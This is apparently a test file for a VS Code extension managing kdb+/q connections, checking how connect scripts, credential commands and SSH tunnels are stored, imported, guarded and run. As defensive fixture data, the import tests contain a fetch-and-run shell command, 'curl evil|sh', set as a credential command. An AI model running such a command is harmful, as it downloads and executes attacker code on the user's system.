// A process's connect script (#916): how it is kept on a process, read from
// a file but never from a discovery server, where its file is read from, and
// the commands that set it, through the stand-in `vscode` module.
const { stub } = require("./vscode_stub.js");
const test = require("node:test");
const assert = require("node:assert");
const pkg = require("../package.json");
const { parseProcesses, processTooltip, readProcessFile } = require("../out/processes.js");
const { CONNECT_SCRIPT_COMMANDS, onConnectBrought, onConnectOf, scriptOf, scriptPath, scriptsBrought, scriptSummary, sharedEntry, withScript } = require("../out/connectscript.js");
const { Live } = require("../out/live.js");

const proc = (label, extra = {}) => ({ label, host: "h", port: 1, tags: [], ...extra });

test("a process runs init code or an init file, and code wins over a file", () => {
  assert.deepStrictEqual(scriptOf(proc("a", { init: "x:1" })), { kind: "code", code: "x:1" });
  assert.deepStrictEqual(scriptOf(proc("a", { initFile: "init.q" })), { kind: "file", file: "init.q" });
  assert.deepStrictEqual(scriptOf(proc("a", { init: "x:1", initFile: "init.q" })), { kind: "code", code: "x:1" });
  assert.strictEqual(scriptOf(proc("a", { init: "  " })), undefined);
  assert.strictEqual(scriptOf(proc("a")), undefined);
  assert.deepStrictEqual(withScript(proc("a", { initFile: "f.q" }), { kind: "code", code: "y" }), proc("a", { init: "y" }));
  assert.deepStrictEqual(withScript(proc("a", { init: "y" }), { kind: "file", file: "f.q" }), proc("a", { initFile: "f.q" }));
  assert.deepStrictEqual(withScript(proc("a", { init: "y" }), undefined), proc("a"));
});

test("a process file's scripts are read; a discovery server's never", () => {
  const json = [{ label: "a", host: "h", port: 1, init: "x:1" }, { label: "b", host: "h", port: 2, initFile: " i.q " }, { label: "c", host: "h", port: 3, init: "y", initFile: "i.q" }, { label: "d", host: "h", port: 4, init: 5 }];
  const read = readProcessFile(JSON.stringify(json));
  assert.deepStrictEqual(read.processes.map(scriptOf), [{ kind: "code", code: "x:1" }, { kind: "file", file: "i.q" }, { kind: "code", code: "y" }, undefined]);
  assert.deepStrictEqual(read.problems, ["Entry 3 (c) has both init and initFile: its init code was kept."]);
  assert.deepStrictEqual(read.processes[2].initFile, undefined);
  // parseProcesses is what discovery reads a server's list with.
  assert.ok(parseProcesses(json).processes.every((p) => scriptOf(p) === undefined));
  assert.deepStrictEqual(parseProcesses(json).problems, []);
});

test("the tooltip says a process runs a script on connect", () => {
  assert.match(processTooltip(proc("a", { init: "x:1" })), /runs q code on connect/);
  assert.match(processTooltip(proc("a", { initFile: "my_init.q" })), /runs my\\_init\\.q on connect/);
  assert.doesNotMatch(processTooltip(proc("a")), /on connect/);
});

test("a script file is read from the home directory or the workspace folder", () => {
  assert.strictEqual(scriptPath("/abs/i.q", "/home/u", "/ws"), "/abs/i.q");
  assert.strictEqual(scriptPath("~/i.q", "/home/u", "/ws"), "/home/u/i.q");
  assert.strictEqual(scriptPath("q/i.q", "/home/u", "/ws"), "/ws/q/i.q");
  assert.strictEqual(scriptPath("q/i.q", "/home/u", undefined), undefined);
});

test("an import brings scripts that are new or changed, not ones already kept", () => {
  const before = [proc("a", { init: "x:1" }), proc("b")];
  assert.deepStrictEqual(scriptsBrought(before, [proc("a", { init: "x:1" }), proc("b", { init: "y" }), proc("c", { initFile: "f.q" }), proc("d")]), ["b", "c"]);
  assert.deepStrictEqual(scriptsBrought(before, [proc("a", { init: "x:2" })]), ["a"]);
});

// Import asked about connect scripts only: a file's credential command (a
// shell command run on every connect), launch definition and SSH tunnel
// were taken silently, so importing a list and clicking Connect ran it.
test("an import brings credential commands, launch definitions and tunnels as it does scripts (#1108)", () => {
  const before = [proc("a", { ssh: "bastion" }), proc("b", { credentialCommand: "pass q" })];
  const incoming = [proc("a", { ssh: "bastion" }), proc("b", { credentialCommand: "curl evil|sh" }), proc("c", { launch: { command: "q" }, init: "x:1" }), proc("d")];
  assert.deepStrictEqual(onConnectBrought(before, incoming), [
    { label: "b", what: ["credential command"] },
    { label: "c", what: ["connect script", "launch definition"] },
  ]);
  // Taken without them: what was there before, or none.
  assert.deepStrictEqual(onConnectOf(incoming[1], before[1]), proc("b", { credentialCommand: "pass q" }));
  assert.deepStrictEqual(onConnectOf(incoming[2], undefined), proc("c"));
  assert.deepStrictEqual(onConnectOf(proc("a", { ssh: "evil", tags: ["t"] }), before[0]), proc("a", { ssh: "bastion", tags: ["t"] }));
});

test("a script is summed up in a line", () => {
  assert.strictEqual(scriptSummary(undefined), "none");
  assert.strictEqual(scriptSummary({ kind: "file", file: "i.q" }), "file i.q");
  assert.strictEqual(scriptSummary({ kind: "code", code: "\na:1\nb:2\n" }), "code: a:1 (+1 lines)");
  assert.match(scriptSummary({ kind: "code", code: "x".repeat(100) }), /^code: x{59}…$/);
});

test("Set Connect Script is on a saved process's row only", () => {
  const rows = pkg.contributes.menus["view/item/context"].filter((m) => m.command === CONNECT_SCRIPT_COMMANDS.set);
  assert.deepStrictEqual(rows.map((m) => m.when), ["view == q-lint.processes && viewItem =~ /^process/ && config.q-lint.connection.connectScript.enable"]);
  const palette = pkg.contributes.menus.commandPalette.find((m) => m.command === CONNECT_SCRIPT_COMMANDS.set);
  assert.strictEqual(palette.when, "config.q-lint.connection.connectScript.enable");
});

async function setUp(t, processes) {
  stub.reset();
  const context = stub.newContext();
  await context.globalState.update("q-lint.processes", processes);
  const live = new Live(context);
  t.after(() => {
    for (const d of context.subscriptions) d.dispose?.();
  });
  return { live, context, run: (...args) => stub.commands.get(CONNECT_SCRIPT_COMMANDS.set)(...args) };
}

test("Set Connect Script asks for code, a file or none, and keeps it on the process", async (t) => {
  const { live, run } = await setUp(t, [proc("a"), proc("b", { tags: ["prod"] })]);
  let offered;
  stub.picks.push(({ items }) => ((offered = items.map((i) => [i.label, i.description])), items[0]));
  stub.inputs.push("\\d .x\nv:1");
  await run("a");
  assert.deepStrictEqual(offered, [["q Code", undefined], ["q File", undefined], ["None", "current: none"]]);
  assert.deepStrictEqual(scriptOf(live.processes()[0]), { kind: "code", code: "\\d .x\nv:1" });
  // The box starts from it; Escape changes nothing.
  let value;
  stub.picks.push("q Code");
  stub.inputs.push((o) => ((value = o.value), undefined));
  await run("a");
  assert.strictEqual(value, "\\d .x\nv:1");
  assert.ok(scriptOf(live.processes()[0]));
  stub.picks.push("None");
  await run("a");
  assert.strictEqual(scriptOf(live.processes()[0]), undefined);
  // On a production process it is asked first, and No sets nothing.
  stub.picks.push(({ message }) => (assert.match(message, /production process/), undefined));
  await run("b", { kind: "code", code: "x:1" });
  assert.strictEqual(scriptOf(live.processes()[1]), undefined);
  stub.picks.push("Set Script");
  await run("b", { kind: "file", file: "init.q" });
  assert.deepStrictEqual(scriptOf(live.processes()[1]), { kind: "file", file: "init.q" });
  await run("b", null);
  assert.strictEqual(scriptOf(live.processes()[1]), undefined);
});

test("Edit Process keeps the connect script; Import asks before taking one", async (t) => {
  const { live } = await setUp(t, [proc("a", { init: "x:1" })]);
  // Edit: label, host, port, TLS, user, tags.
  stub.inputs.push("a2", "h", "1");
  stub.picks.push("No");
  stub.inputs.push("", "");
  await stub.commands.get("q-lint.editProcess")("a");
  assert.deepStrictEqual(live.processes().map((p) => [p.label, scriptOf(p)]), [["a2", { kind: "code", code: "x:1" }]]);
  const vscode = require("vscode");
  const fs = vscode.workspace.fs;
  const list = JSON.stringify({ processes: [{ label: "a2", host: "h", port: 1, init: "evil:1" }, { label: "n", host: "h", port: 2, initFile: "i.q" }] });
  vscode.workspace.fs = { readFile: async () => Buffer.from(list) };
  t.after(() => (vscode.workspace.fs = fs));
  // Without scripts: a2 keeps its own, n gets none.
  let asked;
  stub.picks.push(({ message }) => ((asked = message), "Import without Scripts"));
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.match(asked, /gives 2 process\(es\) a connect script.*: a2, n\. Keep the scripts\?/);
  assert.deepStrictEqual(live.processes().map((p) => [p.label, scriptOf(p)]), [["a2", { kind: "code", code: "x:1" }], ["n", undefined]]);
  // Escape imports nothing; with scripts takes them.
  stub.picks.push(undefined);
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.strictEqual(scriptOf(live.processes()[0]).code, "x:1");
  stub.picks.push("Import with Scripts");
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.deepStrictEqual(live.processes().map((p) => scriptOf(p)), [{ kind: "code", code: "evil:1" }, { kind: "file", file: "i.q" }]);
});

test("Import asks before taking a credential command, and drops it on without (#1108)", async (t) => {
  const { live } = await setUp(t, [proc("a")]);
  const vscode = require("vscode");
  const fs = vscode.workspace.fs;
  const list = JSON.stringify({ processes: [{ label: "a", host: "h", port: 1, credentialCommand: "curl evil|sh" }, { label: "n", host: "h", port: 2, ssh: "jump", launch: { command: "q" } }] });
  vscode.workspace.fs = { readFile: async () => Buffer.from(list) };
  t.after(() => (vscode.workspace.fs = fs));
  let asked;
  stub.picks.push(({ message, items }) => ((asked = [message, items.slice(1)]), "Import without Them"));
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.match(asked[0], /gives 2 process\(es\) what runs at every connect.*: a \(credential command\), n \(launch definition, SSH tunnel\)\. Keep them\?/);
  assert.deepStrictEqual(asked[1], ["Import with Them", "Import without Them"]);
  assert.deepStrictEqual(live.processes(), [proc("a"), proc("n", { port: 2 })]);
  stub.picks.push("Import with Them");
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.deepStrictEqual(live.processes().map((p) => [p.credentialCommand, p.ssh, p.launch]), [["curl evil|sh", undefined, undefined], [undefined, "jump", { command: "q" }]]);
});

test("Import asks before taking away TLS, a tunnel or a guarded tag, and forgets a password it reroutes (#1269)", async (t) => {
  const { live, context } = await setUp(t, [proc("a", { tls: true, ssh: "jump", tags: ["prod"] }), proc("b")]);
  context.secrets.all.set("q-lint.password.a", "pw");
  const vscode = require("vscode");
  const fs = vscode.workspace.fs;
  vscode.workspace.fs = { readFile: async () => Buffer.from(JSON.stringify([proc("a"), proc("b", { tags: ["x"] })])) };
  t.after(() => (vscode.workspace.fs = fs));
  let asked;
  stub.picks.push(({ message, items }) => ((asked = [message, items.slice(1)]), "Keep Them"));
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.match(asked[0], /takes from 1 process\(es\) what protects them.*: a \(TLS, SSH tunnel, tag prod\)\. Keep them\?/);
  assert.deepStrictEqual(asked[1], ["Keep Them", "Import as Written"]);
  assert.deepStrictEqual(live.processes(), [proc("a", { tls: true, ssh: "jump", tags: ["prod"] }), proc("b", { tags: ["x"] })]);
  assert.strictEqual(context.secrets.all.get("q-lint.password.a"), "pw");
  // Escape imports nothing; as written takes them away, and the password
  // given for TLS through the tunnel is not sent in the clear.
  stub.picks.push(undefined);
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.strictEqual(live.processes()[0].tls, true);
  stub.picks.push("Import as Written");
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.deepStrictEqual(live.processes()[0], proc("a"));
  assert.strictEqual(context.secrets.all.has("q-lint.password.a"), false);
});

test("Import of a list naming a process by its address only keeps what was saved on it (#3093)", async (t) => {
  const held = { init: "x:1", launch: { script: "rdb.q" }, credentialCommand: "vault read rdb", timeout: 30, gateway: ["rdb", "hdb"] };
  const { live } = await setUp(t, [proc("rdb", { user: "me", ...held })]);
  const vscode = require("vscode");
  const fs = vscode.workspace.fs;
  vscode.workspace.fs = { readFile: async () => Buffer.from(JSON.stringify([{ label: "rdb", host: "h2", port: 2, user: "me", tags: ["dev"] }])) };
  t.after(() => (vscode.workspace.fs = fs));
  await stub.commands.get("q-lint.importProcesses")(vscode.Uri.file("/l.json"));
  assert.deepStrictEqual(stub.messages.map((m) => m[1]), ["q-lint: imported 1 q process(es)."]);
  assert.deepStrictEqual(live.processes(), [{ label: "rdb", host: "h2", port: 2, user: "me", tags: ["dev"], ...held }]);
});

test("with q-lint.connection.connectScript.enable off, Set Connect Script refuses and no script is sent", async (t) => {
  const net = require("node:net");
  const messages = [];
  const server = net.createServer((socket) => {
    socket.on("error", () => {});
    let shook = false;
    socket.on("data", (chunk) => {
      if (!shook) {
        shook = true;
        socket.write(Buffer.from([3]));
        return;
      }
      messages.push(chunk.length);
    });
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  t.after(() => server.close());
  const { live, run } = await setUp(t, [{ label: "s", host: "127.0.0.1", port: server.address().port, tags: [], init: "x:1" }]);
  t.after(() => stub.commands.get("q-lint.disconnectProcess")?.());
  stub.config.user["connection.connectScript.enable"] = false;
  await run("s", null);
  assert.deepStrictEqual(stub.messages.at(-1), ["info", "q-lint: Connect scripts is turned off. Set q-lint.connection.connectScript.enable to true to turn it on."]);
  assert.ok(scriptOf(live.processes()[0]), "the script is kept");
  assert.strictEqual(await live.connectTo("s"), true);
  await new Promise((r) => setTimeout(r, 100));
  assert.deepStrictEqual(messages, [], "nothing was sent on connect");
});

// The guard's question about a connect script can be open for as long as
// the user likes; a disconnect meanwhile gave the connect up, and "Run
// Anyway" after it still sent the script (#1357).
test("a connect script is not sent once the connect was given up while the read-only guard asked", async (t) => {
  const { fakeQ } = require("./fakeq.js");
  const q = await fakeQ(null);
  t.after(() => q.close());
  const { live } = await setUp(t, [{ label: "p", host: "127.0.0.1", port: q.port, tags: ["prod"], init: "secretTable:([]a:1 2)" }]);
  t.after(() => stub.commands.get("q-lint.disconnectProcess")?.());
  const scripts = () => q.sent.filter((m) => JSON.stringify(m).includes("secretTable")).length;
  // Answers the guard's question only: a message from a test before this
  // one (its connection closing) leaves the answer for the question.
  const answer = (disconnectFirst) => {
    const pick = async ({ message }) => {
      if (!/connect script of p/i.test(message)) {
        stub.picks.unshift(pick);
        return undefined;
      }
      if (disconnectFirst) {
        await stub.commands.get("q-lint.disconnectProcess")();
      }
      return "Run Anyway";
    };
    stub.picks.push(pick);
  };
  answer(true);
  assert.strictEqual(await live.connectTo("p"), false);
  await new Promise((r) => setTimeout(r, 100));
  assert.strictEqual(scripts(), 0, "nothing was sent to a process the user disconnected from");
  // Left to finish, the same answer sends it.
  answer(false);
  assert.strictEqual(await live.connectTo("p"), true);
  assert.strictEqual(scripts(), 1);
});

// A tile's timer or a due schedule asked the guard's modal question about a
// connect script with nobody there, and waited on it (#1618).
test("a run from a timer asks nothing about a connect script: one the guard holds fails the run, unsent", async (t) => {
  const { fakeQ } = require("./fakeq.js");
  const q = await fakeQ(null);
  t.after(() => q.close());
  const { live } = await setUp(t, [{ label: "p", host: "127.0.0.1", port: q.port, tags: ["prod"], init: "secretTable:([]a:1 2)" }]);
  const asked = stub.messages.length;
  await assert.rejects(live.runApart(live.processes()[0], "1+1", undefined, { unattended: true }), /connect script of p was not run, and nothing was/);
  assert.strictEqual(stub.messages.slice(asked).filter(([, text]) => /connect script/i.test(text)).length, 0, JSON.stringify(stub.messages.slice(asked)));
  assert.strictEqual(q.sent.filter((m) => JSON.stringify(m).includes("secretTable")).length, 0);
  assert.strictEqual(q.sent.filter((m) => JSON.stringify(m).includes("1+1")).length, 0);
});

// A saved process is every window's: a script file kept relative to the
// first folder ran another workspace's file of that name, and in one not
// trusted that was the repository's q code on the user's process (#1527).
test("a connect script file is kept by its full path, and a relative one is not run in a workspace not trusted", async (t) => {
  const vscode = require("vscode");
  const { fakeQ } = require("./fakeq.js");
  const q = await fakeQ(null);
  t.after(() => q.close());
  const { live, run } = await setUp(t, [proc("a"), { label: "p", host: "127.0.0.1", port: q.port, tags: [], initFile: "init.q" }]);
  t.after(() => stub.commands.get("q-lint.disconnectProcess")?.());
  const saved = { folders: vscode.workspace.workspaceFolders, dialog: vscode.window.showOpenDialog, trusted: vscode.workspace.isTrusted, fs: vscode.workspace.fs };
  t.after(() => {
    vscode.workspace.workspaceFolders = saved.folders;
    vscode.window.showOpenDialog = saved.dialog;
    vscode.workspace.isTrusted = saved.trusted;
    vscode.workspace.fs = saved.fs;
  });
  vscode.workspace.workspaceFolders = [{ uri: vscode.Uri.file("/proj/a") }];
  vscode.window.showOpenDialog = async () => [vscode.Uri.file("/proj/a/init.q")];
  stub.picks.push("q File");
  await run("a");
  assert.deepStrictEqual(scriptOf(live.processes()[0]), { kind: "file", file: "/proj/a/init.q" });
  // Connected from a workspace not trusted, the relative one is not read.
  let read = 0;
  vscode.workspace.fs = { readFile: async () => (read++, Buffer.from("fromRepo:1")) };
  vscode.workspace.isTrusted = false;
  assert.strictEqual(await live.connectTo("p"), true);
  assert.strictEqual(read, 0);
  assert.deepStrictEqual(q.sent.filter((m) => JSON.stringify(m).includes("fromRepo")), []);
  assert.match(stub.messages.find((m) => /connect script of p failed/.test(m[1]))[1], /not trusted: it was not run/);
});

// A vscode-vfs pick was kept by its fsPath, /acme/desk/init.q, and read
// from the local disk at every connect; a relative one was read against
// the virtual folder's path (#2515).
test("a connect script picked in a virtual folder is refused, and a relative one is read from the first folder on disk", async (t) => {
  const vscode = require("vscode");
  const { fakeQ } = require("./fakeq.js");
  const q = await fakeQ(null);
  t.after(() => q.close());
  const { live, run } = await setUp(t, [proc("a"), { label: "p", host: "127.0.0.1", port: q.port, tags: [], initFile: "init.q" }]);
  t.after(() => stub.commands.get("q-lint.disconnectProcess")?.());
  const saved = { folders: vscode.workspace.workspaceFolders, dialog: vscode.window.showOpenDialog, fs: vscode.workspace.fs };
  t.after(() => {
    vscode.workspace.workspaceFolders = saved.folders;
    vscode.window.showOpenDialog = saved.dialog;
    vscode.workspace.fs = saved.fs;
  });
  const virtual = (p) => ({ scheme: "vscode-vfs", authority: "github", path: p, fsPath: p, toString: () => `vscode-vfs://github${p}` });
  vscode.workspace.workspaceFolders = [{ uri: virtual("/acme/desk"), name: "desk", index: 0 }, { uri: vscode.Uri.file("/w/local"), name: "local", index: 1 }];
  let from;
  vscode.window.showOpenDialog = async (o) => ((from = o.defaultUri), [virtual("/acme/desk/init.q")]);
  stub.picks.push("q File");
  await run("a");
  assert.strictEqual(from.fsPath, "/w/local", "the dialog starts in the folder on disk");
  assert.strictEqual(scriptOf(live.processes()[0]), undefined);
  assert.match(stub.messages.at(-1)[1], /vscode-vfs:\/\/github\/acme\/desk\/init\.q is not a file on disk.*not set/);
  const reads = [];
  vscode.workspace.fs = { readFile: async (uri) => (reads.push(uri.fsPath), Buffer.from("x:1")) };
  assert.strictEqual(await live.connectTo("p"), true);
  assert.deepStrictEqual(reads, [require("node:path").resolve("/w/local", "init.q")]);
});

// Diff Function, Find in Processes, table info and streams opened their own
// connection with no connect script, so they queried a session it never
// prepared: another namespace, a login not made (#1509).
test("a connection apart runs the process's connect script before its query", async (t) => {
  const { fakeQ, heads } = require("./fakeq.js");
  const q = await fakeQ((m) => (heads([m])[0] === "{x}" ? 1 : { ok: true, type: -7, text: ["1"] }));
  t.after(() => q.close());
  const { live } = await setUp(t, [{ label: "p", host: "127.0.0.1", port: q.port, tags: [], init: "setUp:1" }]);
  await live.callSeparate(live.processes()[0], (c) => c.call("{x}", 1));
  assert.strictEqual(q.sent.length, 2);
  assert.ok(JSON.stringify(q.sent[0]).includes("setUp:1"), JSON.stringify(q.sent[0]));
  assert.strictEqual(heads(q.sent)[1], "{x}");
});

/// A q process played by a socket server that answers anything but a
/// message holding "block": a connect script that never returns.
async function blockingQ(t) {
  const net = require("node:net");
  const { serialize } = require("node-q/lib/c.js");
  const sockets = new Set();
  const server = net.createServer((socket) => {
    sockets.add(socket);
    socket.on("error", () => {});
    let shook = false;
    socket.on("data", (chunk) => {
      if (!shook) {
        shook = true;
        socket.write(Buffer.from([3]));
      } else if (!chunk.includes("block")) {
        const out = serialize(1);
        out.writeUInt8(2, 1);
        socket.write(out);
      }
    });
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  t.after(() => (sockets.forEach((s) => s.destroy()), server.close()));
  return { port: server.address().port };
}

// A connect script that never answered held the connect for ever: Disconnect
// closed nothing, and every connect and query after it waited (#1505).
test("a connect script that blocks is closed by Disconnect, and times out", async (t) => {
  const q = await blockingQ(t);
  const { live } = await setUp(t, [
    { label: "p", host: "127.0.0.1", port: q.port, tags: [], init: "block[]" },
    { label: "b", host: "127.0.0.1", port: q.port, tags: [] },
    { label: "t", host: "127.0.0.1", port: q.port, tags: [], init: "block[]", timeout: 1 },
  ]);
  t.after(() => stub.commands.get("q-lint.disconnectProcess")?.());
  const connecting = live.connectTo("p");
  await new Promise((r) => setTimeout(r, 200));
  await stub.commands.get("q-lint.disconnectProcess")();
  assert.strictEqual(await connecting, false);
  assert.strictEqual(live.activeLabel(), undefined);
  assert.strictEqual(await live.connectTo("b"), true);
  // With a timeout, it is given up when the timeout passes, and said.
  assert.strictEqual(await live.connectTo("t"), false);
  assert.match(stub.messages.filter(([k]) => k === "warning").at(-1)[1], /the connect script of t failed: .*1 s/);
});

// Connecting elsewhere waited on a blocking script with the default timeout
// 0, so the other process never connected (#1712).
test("connecting elsewhere closes a connect script that blocks", async (t) => {
  const q = await blockingQ(t);
  const { live } = await setUp(t, [
    { label: "p", host: "127.0.0.1", port: q.port, tags: [], init: "block[]" },
    { label: "b", host: "127.0.0.1", port: q.port, tags: [] },
  ]);
  t.after(() => stub.commands.get("q-lint.disconnectProcess")?.());
  const p = live.connectTo("p");
  await new Promise((r) => setTimeout(r, 200));
  const b = live.connectTo("b");
  const waited = new Promise((r) => setTimeout(() => r("still waiting"), 3000));
  assert.strictEqual(await Promise.race([b, waited]), true);
  assert.strictEqual(await p, false);
  assert.strictEqual(live.activeLabel(), "b");
});

// A connection apart whose script timed out or failed was handed out closed,
// or unprepared, with only a warning (#1713).
test("a connection apart whose connect script fails or times out is not handed out", async (t) => {
  const q = await blockingQ(t);
  const { live } = await setUp(t, [
    { label: "t", host: "127.0.0.1", port: q.port, tags: [], init: "block[]", timeout: 1 },
  ]);
  await assert.rejects(live.openSeparate(live.processes()[0]), /the connect script of t failed: .*1 s/);
  let used = false;
  await assert.rejects(live.callSeparate(live.processes()[0], async () => (used = true)), /the connect script of t failed/);
  assert.strictEqual(used, false);
  assert.deepStrictEqual(stub.messages.filter(([k, m]) => k === "warning" && /connect script of t/.test(m)), []);
  const { fakeQ } = require("./fakeq.js");
  const e = await fakeQ(1);
  t.after(() => e.close());
  const failing = { label: "e", host: "127.0.0.1", port: e.port, tags: [], initFile: "/nowhere/init.q" };
  await assert.rejects(live.openSeparate(failing), /the connect script of e failed: could not read/);
});

// Set Connect Script keeps the full path, which Share All committed: every
// clone failed to read /Users/me/repo/init.q (#1717).
test("a connect script file inside the folder is shared relative to it", () => {
  const p = proc("a", { initFile: "/Users/me/repo/q/init.q", user: "u" });
  assert.deepStrictEqual(sharedEntry(p, true, "/Users/me/repo"), { ...p, initFile: "q/init.q" });
  assert.deepStrictEqual(sharedEntry(p, true, "/Users/me/other"), p);
  // A folder named with two dots first is a folder inside, not the way out (#2002).
  assert.deepStrictEqual(sharedEntry(proc("a", { initFile: "/Users/me/repo/..q/init.q" }), true, "/Users/me/repo"), proc("a", { initFile: "..q/init.q" }));
  assert.deepStrictEqual(sharedEntry(proc("a", { initFile: "/Users/me/init.q" }), true, "/Users/me/repo"), proc("a", { initFile: "/Users/me/init.q" }));
  assert.deepStrictEqual(sharedEntry(proc("a", { initFile: "~/init.q" }), true, "/Users/me/repo"), proc("a", { initFile: "~/init.q" }));
  assert.deepStrictEqual(sharedEntry(p, false, "/Users/me/repo"), proc("a", { user: "u" }));
  // The list a clone reads runs it from its own folder.
  assert.strictEqual(scriptPath(sharedEntry(p, true, "/Users/me/repo").initFile, "/home/c", "/home/c/repo"), "/home/c/repo/q/init.q");
});
